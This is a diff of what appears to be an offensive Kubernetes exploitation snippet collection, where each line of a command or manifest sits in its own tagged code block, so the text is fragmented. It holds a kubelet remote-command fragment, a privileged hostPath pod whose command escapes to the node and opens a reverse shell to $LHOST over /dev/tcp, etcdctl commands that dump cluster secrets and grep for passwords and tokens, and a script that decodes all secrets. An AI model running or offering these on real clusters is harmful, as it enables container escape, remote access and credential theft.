@@ -448,7 +448,7 @@ curl -sk https://$TARGET:10250/run/$NAMESPACE/$POD/$CONTAINER \
 
 ### bs0e05bgmmptl7ag1
 ```bash
-  -d "cmd=id"
+-d "cmd=id"
 ```
 
 **Tags:** kubernetes, kubelet, rce, exploitation
@@ -517,7 +517,7 @@ metadata:
 
 ### cgkinoi1amptl7ahq
 ```bash
-  name: pwn
+name: pwn
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -525,7 +525,7 @@ metadata:
 
 ### mhzl9aij5mptl7ahw
 ```bash
-  namespace: default
+namespace: default
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -541,7 +541,7 @@ spec:
 
 ### xsqq5cww5mptl7ai6
 ```bash
-  hostPID: true
+hostPID: true
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -549,7 +549,7 @@ spec:
 
 ### ruga04t29mptl7aib
 ```bash
-  hostIPC: true
+hostIPC: true
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -557,7 +557,7 @@ spec:
 
 ### unrab0th6mptl7aif
 ```bash
-  hostNetwork: true
+hostNetwork: true
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -565,7 +565,7 @@ spec:
 
 ### mfsmnbljimptl7aik
 ```bash
-  containers:
+containers:
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -573,7 +573,7 @@ spec:
 
 ### goosz1jipmptl7aiq
 ```bash
-  - name: pwn
+- name: pwn
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -581,7 +581,7 @@ spec:
 
 ### 8j3dt3po4mptl7aiv
 ```bash
-    image: alpine
+image: alpine
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -589,7 +589,7 @@ spec:
 
 ### eqs0y1hjrmptl7aiz
 ```bash
-    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -- bash -i >& /dev/tcp/$LHOST/4444 0>&1"]
+command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -- bash -i >& /dev/tcp/$LHOST/4444 0>&1"]
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -597,7 +597,7 @@ spec:
 
 ### w45tvreximptl7aj4
 ```bash
-    securityContext:
+securityContext:
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -605,7 +605,7 @@ spec:
 
 ### 2fi3b61nhmptl7aj9
 ```bash
-      privileged: true
+privileged: true
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -613,7 +613,7 @@ spec:
 
 ### mdhdvl5ocmptl7ajf
 ```bash
-    volumeMounts:
+volumeMounts:
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -621,7 +621,7 @@ spec:
 
 ### lbp3vt60tmptl7ajl
 ```bash
-    - mountPath: /host
+- mountPath: /host
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -629,7 +629,7 @@ spec:
 
 ### b9xo92rjumptl7ajq
 ```bash
-      name: host-vol
+name: host-vol
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -637,7 +637,7 @@ spec:
 
 ### r2edlpcolmptl7ajv
 ```bash
-  volumes:
+volumes:
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -645,7 +645,7 @@ spec:
 
 ### v7zr05puymptl7ak0
 ```bash
-  - name: host-vol
+- name: host-vol
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -653,7 +653,7 @@ spec:
 
 ### djb3uqt8zmptl7ak6
 ```bash
-    hostPath:
+hostPath:
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -661,7 +661,7 @@ spec:
 
 ### 2pxdfyy50mptl7akb
 ```bash
-      path: /
+path: /
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -669,7 +669,7 @@ spec:
 
 ### ji29qrq4dmptl7akh
 ```bash
-  restartPolicy: Never
+restartPolicy: Never
 ```
 
 **Tags:** kubernetes, pod, privesc, container-escape, exploitation
@@ -714,7 +714,7 @@ _etcd — Secret Extraction_
 
 ### bo347ynrrmptl7alr
 ```bash
-  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+--cacert=/etc/kubernetes/pki/etcd/ca.crt \
 ```
 
 **Tags:** kubernetes, etcd, secrets, exploitation
@@ -722,7 +722,7 @@ _etcd — Secret Extraction_
 
 ### zjhv4fotbmptl7aly
 ```bash
-  --cert=/etc/kubernetes/pki/etcd/server.crt \
+--cert=/etc/kubernetes/pki/etcd/server.crt \
 ```
 
 **Tags:** kubernetes, etcd, secrets, exploitation
@@ -730,7 +730,7 @@ _etcd — Secret Extraction_
 
 ### tgwzte3o1mptl7am3
 ```bash
-  --key=/etc/kubernetes/pki/etcd/server.key \
+--key=/etc/kubernetes/pki/etcd/server.key \
 ```
 
 **Tags:** kubernetes, etcd, secrets, exploitation
@@ -738,7 +738,7 @@ _etcd — Secret Extraction_
 
 ### kk0f3y81omptl7am8
 ```bash
-  get / --prefix --keys-only
+get / --prefix --keys-only
 ```
 
 **Tags:** kubernetes, etcd, secrets, exploitation
@@ -754,7 +754,7 @@ etcdctl --endpoints=https://$TARGET:2379 \
 
 ### b0v3qvzi3mptl7amj
 ```bash
-  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+--cacert=/etc/kubernetes/pki/etcd/ca.crt \
 ```
 
 **Tags:** kubernetes, etcd, secrets, exploitation
@@ -762,7 +762,7 @@ etcdctl --endpoints=https://$TARGET:2379 \
 
 ### k19n3wt1imptl7amo
 ```bash
-  --cert=/etc/kubernetes/pki/etcd/server.crt \
+--cert=/etc/kubernetes/pki/etcd/server.crt \
 ```
 
 **Tags:** kubernetes, etcd, secrets, exploitation
@@ -770,7 +770,7 @@ etcdctl --endpoints=https://$TARGET:2379 \
 
 ### 11y6zcpn0mptl7amt
 ```bash
-  --key=/etc/kubernetes/pki/etcd/server.key \
+--key=/etc/kubernetes/pki/etcd/server.key \
 ```
 
 **Tags:** kubernetes, etcd, secrets, exploitation
@@ -778,7 +778,7 @@ etcdctl --endpoints=https://$TARGET:2379 \
 
 ### e25rp7cmjmptl7an0
 ```bash
-  get /registry/secrets --prefix | strings | grep -A2 "password\|secret\|token"
+get /registry/secrets --prefix | strings | grep -A2 "password\|secret\|token"
 ```
 
 **Tags:** kubernetes, etcd, secrets, exploitation
@@ -884,7 +884,7 @@ for item in d['items']:
 
 ### vpypnll3fmptl7aqg
 ```bash
-    ns = item['metadata']['namespace']
+ns = item['metadata']['namespace']
 ```
 
 **Tags:** kubernetes, secrets, credentials, hunting
@@ -892,7 +892,7 @@ for item in d['items']:
 
 ### spzs03qipmptl7aqm
 ```bash
-    name = item['metadata']['name']
+name = item['metadata']['name']
 ```
 
 **Tags:** kubernetes, secrets, credentials, hunting
@@ -900,7 +900,7 @@ for item in d['items']:
 
 ### zjqxon2cumptl7aqr
 ```bash
-    data = item.get('data', {})
+data = item.get('data', {})
 ```
 
 **Tags:** kubernetes, secrets, credentials, hunting
@@ -908,7 +908,7 @@ for item in d['items']:
 
 ### 8ka0uoy4lmptl7aqy
 ```bash
-    for k, v in data.items():
+for k, v in data.items():
 ```
 
 **Tags:** kubernetes, secrets, credentials, hunting
@@ -916,7 +916,7 @@ for item in d['items']:
 
 ### 2o4022sgrmptl7ar4
 ```bash
-        try:
+try:
 ```
 
 **Tags:** kubernetes, secrets, credentials, hunting
@@ -924,7 +924,7 @@ for item in d['items']:
 
 ### y0w4yxw8gmptl7ara
 ```bash
-            print(f'{ns}/{name}/{k}: {base64.b64decode(v).decode()}')
+print(f'{ns}/{name}/{k}: {base64.b64decode(v).decode()}')
 ```
 
 **Tags:** kubernetes, secrets, credentials, hunting
@@ -932,7 +932,7 @@ for item in d['items']:
 
 ### wd3rpm28tmptl7arf
 ```bash
-        except: pass
+except: pass
 ```
 
 **Tags:** kubernetes, secrets, credentials, hunting
